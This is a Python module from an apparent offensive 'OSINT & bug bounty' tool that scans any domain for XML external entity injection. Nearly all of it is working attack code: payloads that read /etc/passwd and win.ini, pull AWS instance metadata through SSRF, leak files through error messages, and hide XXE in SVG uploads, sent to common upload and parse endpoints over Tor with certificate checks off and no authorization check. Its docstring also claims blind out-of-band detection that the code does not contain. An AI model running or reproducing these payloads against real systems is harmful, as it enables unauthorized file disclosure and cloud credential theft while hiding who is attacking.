# ============================================================================
# Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
# Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
#
# Unauthorized copying, distribution, or modification of this software,
# via any medium, is strictly prohibited without written permission.
#
# Licensed users may use this software under the terms of their license.
# For licensing: https://github.com/Mrsultan7890/osints
# ============================================================================

"""
XXE Scanner
- XML External Entity injection via POST endpoints
- Blind XXE via out-of-band (OOB) detection
- XXE in file upload (SVG, XML, DOCX-like)
- Error-based XXE
"""

import re
import logging
import requests
from modules.utils import tor_session

logger = logging.getLogger(__name__)

# Classic XXE — reads /etc/passwd
XXE_CLASSIC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

# Windows XXE
XXE_WINDOWS = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>"""

# SSRF via XXE — cloud metadata
XXE_SSRF = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>"""

# Error-based XXE
XXE_ERROR = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>"""

# SVG XXE (for file upload endpoints)
SVG_XXE = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text>&xxe;</text>
</svg>"""

XXE_PAYLOADS = [
    ('classic',  XXE_CLASSIC,  'application/xml'),
    ('windows',  XXE_WINDOWS,  'application/xml'),
    ('ssrf',     XXE_SSRF,     'application/xml'),
    ('error',    XXE_ERROR,    'application/xml'),
    ('svg',      SVG_XXE,      'image/svg+xml'),
]

XML_ENDPOINTS = [
    '/api/v1/upload', '/upload', '/api/upload',
    '/api/v1/import', '/import', '/api/import',
    '/api/v1/parse', '/parse',
    '/api/v1/convert', '/convert',
    '/api/v1/process', '/process',
    '/api/xml', '/xml', '/soap', '/wsdl',
    '/api/v1/data', '/data',
]

SUCCESS_SIGNATURES = [
    (r'root:x:0:0',          'CRITICAL', 'Linux /etc/passwd read via XXE'),
    (r'\[boot loader\]',     'CRITICAL', 'Windows win.ini read via XXE'),
    (r'instance-id|ami-id',  'CRITICAL', 'AWS metadata read via XXE SSRF'),
    (r'/bin/bash|/bin/sh',   'HIGH',     'Unix path in XXE response'),
    (r'nonexistent',         'HIGH',     'Error-based XXE — file path in error'),
    (r'SYSTEM.*file://',     'HIGH',     'XXE entity reference in error message'),
]


class XXEScanner:

    def run(self, domain: str) -> dict:
        result = {
            'domain': domain,
            'findings': [],
            'total': 0,
            'risk_level': 'LOW',
            'error': None,
        }

        session = tor_session()
        session.verify = False
        session.headers['User-Agent'] = 'Mozilla/5.0'

        base = f"https://{domain}"

        for path in XML_ENDPOINTS:
            url = base + path
            for name, payload, content_type in XXE_PAYLOADS:
                try:
                    r = session.post(
                        url,
                        data=payload.encode('utf-8'),
                        headers={'Content-Type': content_type,
                                 'Accept': 'application/xml, text/xml, */*'},
                        timeout=8,
                    )

                    # Skip if endpoint doesn't exist
                    if r.status_code == 404:
                        break

                    body = r.text
                    for sig, sev, desc in SUCCESS_SIGNATURES:
                        if re.search(sig, body, re.IGNORECASE):
                            result['findings'].append({
                                'severity': sev,
                                'type': f'XXE ({name})',
                                'url': url,
                                'payload_type': name,
                                'evidence': desc,
                                'status_code': r.status_code,
                            })
                            break

                except Exception as e:
                    logger.debug(f"xxe_scanner error: {e}")
            # Also test GET with xml param
            for param in ('xml', 'data', 'input', 'body'):
                try:
                    r = session.get(
                        f"{url}?{param}={XXE_CLASSIC.replace(chr(10),' ')}",
                        timeout=6,
                    )
                    for sig, sev, desc in SUCCESS_SIGNATURES:
                        if re.search(sig, r.text, re.IGNORECASE):
                            result['findings'].append({
                                'severity': sev,
                                'type': 'XXE via GET param',
                                'url': url,
                                'payload_type': 'classic',
                                'evidence': f"param={param}: {desc}",
                                'status_code': r.status_code,
                            })
                            break
                except Exception as e:
                    logger.debug(f"xxe_scanner error: {e}")
        # Deduplicate
        seen = set()
        deduped = []
        for f in result['findings']:
            key = (f['url'], f['evidence'])
            if key not in seen:
                seen.add(key)
                deduped.append(f)
        result['findings'] = deduped

        result['total'] = len(result['findings'])
        if any(f['severity'] == 'CRITICAL' for f in result['findings']):
            result['risk_level'] = 'CRITICAL'
        elif any(f['severity'] == 'HIGH' for f in result['findings']):
            result['risk_level'] = 'HIGH'
        elif result['findings']:
            result['risk_level'] = 'MEDIUM'

        return result
